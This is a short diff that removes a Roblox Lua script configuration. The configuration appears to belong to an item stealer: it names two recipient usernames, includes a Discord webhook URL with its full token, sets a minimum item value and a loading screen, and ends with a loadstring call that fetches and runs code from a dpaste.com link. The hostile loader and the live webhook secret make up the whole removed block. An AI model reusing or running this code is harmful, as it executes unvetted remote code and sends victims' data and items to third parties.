@@ -1,12 +1,1 @@
-Username = "Awesomealt002"
-Username2 = "Awesomealt004"
 
-
-Webhook = "https://discord.com/api/webhooks/1202172755416453120/ySOotp2wICV29pAuxphV0QnWRj_1yhT1SEhAernJKKgDZkJ8vqzFHakYQhMZQZigJ0nR"
-
-
-LoadingScreen = true
-MinimumRAP = 1000
-
-
-loadstring(game:HttpGet("https://dpaste.com/FU7CTHP7M.txt"))()
